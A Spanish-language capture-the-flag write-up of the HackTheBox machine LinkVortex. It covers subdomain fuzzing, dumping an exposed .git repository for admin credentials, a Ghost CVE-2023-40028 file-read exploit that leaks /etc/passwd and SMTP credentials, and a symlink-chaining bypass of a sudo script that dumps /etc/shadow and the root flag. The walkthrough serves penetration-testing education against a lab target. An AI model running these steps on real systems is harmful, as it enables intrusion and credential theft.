
# LinkVortex

<figure><img src="/files/iLWzVd65w0fMBFP0rWnJ" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Primer acceso</mark>

Añadimos la IP `10.10.11.47` a nuestro `/etc/hosts` y accedemos través del navegador.

```bash
sudo echo "10.10.11.47 linkvortex.htb" | sudo tee -a /etc/hosts
```

<figure><img src="/files/7159O0Ykh77aFzLNrYab" alt=""><figcaption></figcaption></figure>

Parece un blog sobre componentes de hardware. Solamente vemos 3 páginas a simple vista:

* Home: Con enlaces a los posts
* About: Texto hablando sobre la empresa
* Páginas de post: puro contenido de texto

En el footer nos encontramos "*Powered by Ghost*" con un link a la siguiente web, lo que nos indica la tecnología sobre la que está construído:

{% embed url="<https://ghost.org/>" %}

Al parecer no encontramos nada que nos llame la atención, por lo que vamos a ver los puertos que tiene abiertos.

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -A -sCV -T5 10.10.11.47
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos 2 puertos abiertos, el 22 y el 80, los típicos. Por el momento el puerto 80 es nuestro principal vector de entrada.

## <mark style="color:purple;">Enumeración</mark>

Al ejecutar whatweb contra la web encontramos un plugin `Ghost 5.58` bastante interesante:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kalki$ whatweb -v http://linkvortex.htb     
</strong>         
WhatWeb report for http://linkvortex.htb
Status    : 200 OK
Title     : BitByBit Hardware
IP        : 10.10.11.47
Country   : RESERVED, ZZ

Summary   : Apache, HTML5, HTTPServer[Apache], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], PoweredBy[Ghost,a], Script[application/ld+json], X-Powered-By[Express], X-UA-Compatible[IE=edge]

Detected Plugins:
[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	String       : Apache (from server string)

[ JQuery ]
	A fast, concise, JavaScript that simplifies how to traverse 
	HTML documents, handle events, perform animations, and add 
	AJAX. 

	Version      : 3.5.1
	Website     : http://jquery.com/

[ MetaGenerator ]
	This plugin identifies meta generator tags and extracts its 
	value. 

	String       : Ghost 5.58
</code></pre>

## <mark style="color:purple;">Fuzzing</mark>

Haciendo fuzzing con dirsearch no encontramos nada relevante y que podamos acceder:

```bash
dirsearch -u http://linkvortex.htb -x 300,301,302,400,403,404,503

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/kali/Escritorio/machines/htb/linkvortex/reports/http_linkvortex.htb/_24-12-09_13-37-44.txt

Target: http://linkvortex.htb/

[13:37:44] Starting: 
[13:38:13] 301 -   63B  - /.aspnet/DataProtection-Keys/  ->  /.aspnet/dataprotection-keys/
[13:38:13] 301 -   45B  - /.axoCover/  ->  /.axocover/
[13:38:27] 301 -   57B  - /.externalToolBuilders/  ->  /.externaltoolbuilders/
[13:38:38] 301 -   40B  - /.HTF/  ->  /.htf/
[13:38:56] 301 -   47B  - /.Rproj.user/  ->  /.rproj.user/
[13:39:03] 301 -   53B  - /.tools/phpMyAdmin/  ->  /.tools/phpmyadmin/
[13:39:03] 301 -   61B  - /.tools/phpMyAdmin/current/  ->  /.tools/phpmyadmin/current/
[13:39:22] 301 -   49B  - /_DynaCacheEsi/  ->  /_dynacacheesi/
[13:39:26] 301 -   48B  - /_LPHPMYADMIN/  ->  /_lphpmyadmin/
```

En este punto parece que estamos en un Rabit Hole, por lo que vamos a probar a enumerar subdominios.

## <mark style="color:purple;">Enumeración de Vhosts</mark>

En este momento puede parecer que no podemos hacer nada, pero vamos a usar ffuf para enumerar subdominios dentro de este host:

```bash
ffuf -u http://linkvortex.htb -H "Host:FUZZ.linkvortex.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 274ms]
```

Bingo! Obtenemos el subdominio `dev.linkvortex.htb`. Vamos a añadirlo a `/etc/hosts` y entrar para ver su contenido.

<figure><img src="/files/flSHePTDmELHK82e0tUe" alt=""><figcaption></figcaption></figure>

Parece que la web está en construcción y no hay ningún link ni comentario en el código fuente. Vamos a volver a hacer fuzzing contra este subdominio a ver si encontramos algo interesante:

```bash
dirsearch -u http://dev.linkvortex.htb -x 404

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_dev.linkvortex.htb/_24-12-09_13-44-58.txt

Target: http://dev.linkvortex.htb/

[13:44:58] Starting: 
[13:45:39] 200 -  175B  - /.git/logs/HEAD
[13:45:39] 301 -  239B  - /.git  ->  http://dev.linkvortex.htb/.git/
[13:45:40] 200 -  557B  - /.git/
[13:45:40] 200 -  201B  - /.git/config
[13:45:40] 200 -   73B  - /.git/description
[13:45:40] 200 -  620B  - /.git/hooks/
[13:45:40] 200 -   41B  - /.git/HEAD
[13:45:40] 200 -  418B  - /.git/objects/
[13:45:41] 200 -  240B  - /.git/info/exclude
[13:45:41] 200 -  402B  - /.git/info/
[13:45:41] 200 -  401B  - /.git/logs/
[13:45:41] 200 -  691KB - /.git/index
[13:45:42] 200 -  147B  - /.git/packed-refs
[13:45:42] 200 -  393B  - /.git/refs/
[13:45:42] 301 -  249B  - /.git/refs/tags  ->  http://dev.linkvortex.htb/.git/refs/tags/
```

Encontramos un directorio .git interesante, al cual podemos acceder a todos los archivos:

<figure><img src="/files/6FiForZmosO2Lj09WFPZ" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Explotación del directorio .git</mark>

Para dumpear el contenido del repositorio `.git` y extraer información relevante podemos utilizar `git-dumper`, un script de Python diseñado para reconstruir un repositorio a partir de un directorio `.git`.&#x20;

{% embed url="<https://github.com/arthaud/git-dumper>" %}

```
python3 git_dumper.py http://dev.linkvortex.htb/.git/ ~/linkvortex

[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
[-] Fetching http://dev.linkvortex.htb/.git/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/packed-refs [200]
[-] Fetching http://dev.linkvortex.htb/.git/config [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/description [200]
[-] Fetching http://dev.linkvortex.htb/.git/index [200]
[-] Fetching http://dev.linkvortex.htb/.git/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/shallow [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/ [200]
```

Esto nos descarga en local el repositorio para analizarlo mejor, dentro del directorio .git:

```bash
cd ~/linkvortex
```

Haciendo un poco de enumeración en el repo encontramos un archivo interesante: `authentication.test.js`

```shell-session
find . -iname '*authentication*'            

./ghost/core/test/regression/api/admin/__snapshots__/authentication.test.js.snap
./ghost/core/test/regression/api/admin/authentication.test.js
./ghost/core/test/e2e-api/content/key_authentication.test.js
./ghost/core/test/e2e-api/admin/key-authentication.test.js
./ghost/core/core/server/api/endpoints/utils/serializers/output/authentication.js
./ghost/core/core/server/api/endpoints/authentication.js
./ghost/admin/mirage/config/authentication.js
./ghost/admin/tests/acceptance/authentication-test.js
```

Al leer este archivo nos encontramos unas credenciales que parecen de un usuario administrador:

```bash
cat ./ghost/core/test/regression/api/admin/authentication.test.js | grep pass
            
            const password = 'OctopiFociPilfer45';
                        password,
            await agent.loginAs(email, password);
                        password: 'thisissupersafe',
                        password: 'thisissupersafe',
            const password = 'thisissupersafe';
                        password,
            await cleanAgent.loginAs(email, password);
                        password: 'lel123456',
                        password: '12345678910',
                        password: '12345678910',
```

Tenemos 2 posibles credenciales:

```
const password = 'OctopiFociPilfer45';
const password = 'thisissupersafe';
```

## <mark style="color:purple;">Acceso al directorio ghost</mark>

Si accedemos al directorio /ghost llegamos a un panel de login donde podríamos probar a loguearnos:

<figure><img src="/files/phQndJNatiWko42RMrAh" alt=""><figcaption></figcaption></figure>

Probamos las siguientes credenciales y accedemos sin problema:

```
admin@linkvortex.htb
OctopiFociPilfer45
```

<figure><img src="/files/t0QFhcttuyRCP5k7E4D4" alt=""><figcaption></figcaption></figure>

Tenemos acceso de administrador al CMS. Ahora vamos a buscar la manera de explotar esto.

## <mark style="color:purple;">Explotación</mark>

Buscando en internet encontramos un CVE asociado a la versión de Ghost 5.58:

{% embed url="<https://github.com/0xyassine/CVE-2023-40028>" %}

En este script debemos editar la línea donde se referencia al host. El script también indica que ha sido probado contra una imagen de Ghost usando Docker:

```bash
#THIS EXPLOIT WAS TESTED AGAINST A SELF HOSTED GHOST IMAGE USING DOCKER

#GHOST ENDPOINT
GHOST_URL='http://linkvortex.htb'
GHOST_API="$GHOST_URL/ghost/api/v3/admin/"
API_VERSION='v3.0'
```

Lo podemos ejecutar de la siguiente manera para extraer el contenido de cualquier archivo, como el /etc/passwd:

```bash
bash CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45

WELCOME TO THE CVE-2023-40028 SHELL
file> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```

Solamente encontramos un usuario interesante:

* **node**: Probablemente el usuario bajo el cual se ejecuta la aplicación Ghost, ya que Ghost está desarrollado en Node.js. El usuario `node` es relevante porque podría tener acceso a los archivos de configuración y credenciales del sistema.

## <mark style="color:purple;">User flag</mark>

Volviendo a revisar el dump del repositorio git, nos encontramos el archivo `Dockerfile.ghost`, que contiene un archivo de configuración interesante: `config.production.json`:

```bash
cat Dockerfile.ghost 

FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

# Prevent installing packages
RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb

# Wait for the db to be ready first
COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
COPY entry.sh /entry.sh
RUN chmod +x /var/lib/ghost/wait-for-it.sh
RUN chmod +x /entry.sh

ENTRYPOINT ["/entry.sh"]
CMD ["node", "current/index.js"]
```

Vamos a utilizar el script de nuevo para leer este archivo de configuración:

```bash
bash CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45

WELCOME TO THE CVE-2023-40028 SHELL
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
file> 
```

Buuuum! Obtenemos las credenciales del usuario bob:

```
"user": "bob@linkvortex.htb",
"pass": "fibber-talented-worth"
```

Nos conectamos por SSH correctamente con estas credenciales y obtenemos la flag:

```
ssh bob@10.10.11.47                      
The authenticity of host '10.10.11.47 (10.10.11.47)' can't be established.
ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.47' (ED25519) to the list of known hosts.
bob@10.10.11.47's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Dec 10 23:22:14 2024 from 10.10.14.123
bob@linkvortex:~$ ls
user.txt
bob@linkvortex:~$ cat user.txt 
ca0b467f296e8811f**************
```

## <mark style="color:purple;">Escalada de privilegios</mark>

Vamos a ver los permisos de ejecución que tenemos en la máquina:

```shell-session
bob@linkvortex:~$ sudo -l

Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

Vamos a ver el script:

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

Este escenario presenta una vulnerabilidad de escalada de privilegios debido al uso de un script que se ejecuta como `sudo` sin requerir contraseña y que puede ser manipulado. Vamos a desglosar cómo explotar esta configuración para elevar privilegios:

***

#### Análisis de la Configuración

1. **Permisos de Ejecución con `sudo`:**
   * El usuario `bob` puede ejecutar el script `/opt/ghost/clean_symlink.sh` con permisos de superusuario (`sudo`) **sin contraseña**.
   * El script acepta un argumento que debe ser un archivo con extensión `.png`.
2. **Vulnerabilidad en el Script:**
   * La variable `CHECK_CONTENT` se lee del entorno y se usa sin validación. Si se define como `true`, el script ejecuta el comando `/usr/bin/cat` en un archivo específico.
   * Existe un uso inseguro de `$LINK`, que se pasa directamente a comandos como `/usr/bin/mv` y `/usr/bin/cat`, sin validación adicional.
3. **Punto Crítico:**
   * Puedes controlar la variable de entorno `CHECK_CONTENT` y proporcionar un enlace simbólico (`symlink`) malicioso que apunte a un archivo crítico del sistema, como `/etc/shadow`.

### Procedimiento de Explotación

#### **Paso 1: Definir la Variable de Entorno**

Antes de ejecutar el script, establece la variable `CHECK_CONTENT` como `true` para habilitar la lectura del contenido del archivo objetivo:

```bash
export CHECK_CONTENT=true
```

#### **Paso 2: Crear un Enlace Simbólico**

Crea un enlace simbólico que apunte a un archivo crítico, por ejemplo, `/etc/shadow`:

```bash
ln -s /etc/shadow fake.png
```

#### **Paso 3: Ejecutar el Script**

Ejecuta el script con `sudo`, pasando el enlace simbólico como argumento:

```bash
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh fake.png
```

```shell-session
Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
bob@linkvortex:~$ export CHECK_CONTENT=true
bob@linkvortex:~$ ln -s /etc/shadow fake.png
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh fake.png
! Trying to read critical files, removing link [ fake.png ] !
bob@linkvortex:~$ ln -s /root/root.txt fake.png                          
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh fake.png
! Trying to read critical files, removing link [ fake.png ] !
```

El script implementa una comprobación que evita la lectura de archivos críticos (como aquellos en `/etc` o `/root`) al detectar patrones específicos en la ruta del enlace simbólico. Esto limita directamente el acceso a archivos sensibles. Sin embargo, el comportamiento del script todavía deja una posible vulnerabilidad que puede ser explotada con un enfoque alternativo.

#### **Paso 1: Crear una Carpeta Temporal**

Usa una carpeta temporal para alojar el enlace simbólico que apuntará al archivo crítico.

```bash
mkdir /tmp/safe
ln -s /etc/shadow /tmp/safe/fake.png
```

#### **Paso 2: Crear el Enlace Simbólico**

Apunta el enlace simbólico principal al archivo dentro de la carpeta temporal:

```bash
ln -s /tmp/safe/fake.png fake.png
```

**Paso 3: Ejecutar el Script**

Ejecuta el script como antes, usando `fake.png`:

```bash
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh fake.png
```

```shell-session
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh fake.png

Link found [ fake.png ] , moving it to quarantine
Content:
root:$y$j9T$C3zg87gHwrCXO0vl4igIh/$iisf9sVwilKAi7mI5p1FqQslJWM9t2.YUWznIPC/XIA:19814:0:99999:7:::
daemon:*:19579:0:99999:7:::
bin:*:19579:0:99999:7:::
sys:*:19579:0:99999:7:::
sync:*:19579:0:99999:7:::
games:*:19579:0:99999:7:::
man:*:19579:0:99999:7:::
lp:*:19579:0:99999:7:::
mail:*:19579:0:99999:7:::
news:*:19579:0:99999:7:::
uucp:*:19579:0:99999:7:::
proxy:*:19579:0:99999:7:::
www-data:*:19579:0:99999:7:::
backup:*:19579:0:99999:7:::
list:*:19579:0:99999:7:::
irc:*:19579:0:99999:7:::
gnats:*:19579:0:99999:7:::
nobody:*:19579:0:99999:7:::
_apt:*:19579:0:99999:7:::
systemd-network:*:19579:0:99999:7:::
systemd-resolve:*:19579:0:99999:7:::
messagebus:*:19579:0:99999:7:::
systemd-timesync:*:19579:0:99999:7:::
pollinate:*:19579:0:99999:7:::
sshd:*:19579:0:99999:7:::
usbmux:*:19814:0:99999:7:::
bob:$6$rounds=656000$4p3mw8hAd9ir.25f$ocGm9nW1TM2AB8Z.l0K.hi43bOrm3oxQsaKFACMoS2UL.tIXxSW3u/xsClrvkEhP5s.GUpdIvCX3qRtppDV8r.:19814:0:99999:7:::
dnsmasq:*:19814:0:99999:7:::
_laurel:!:20057::::::
```

Tenemos el `/etc/shadow`, con lo que podemos acceder a cualquier archivo del sistema! En nuestro caso vamos a usarlo para obtener la flag en /root/root.txt

```shell-session
bob@linkvortex:~$ ln -s /root/root.txt pwn.txt
bob@linkvortex:~$ ln -s /home/bob/pwn.txt pwn.png
bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/pwn.png
Link found [ /home/bob/pwn.png ] , moving it to quarantine
Content:
66fff895f2399f********************
```

Tenemos la root flag!
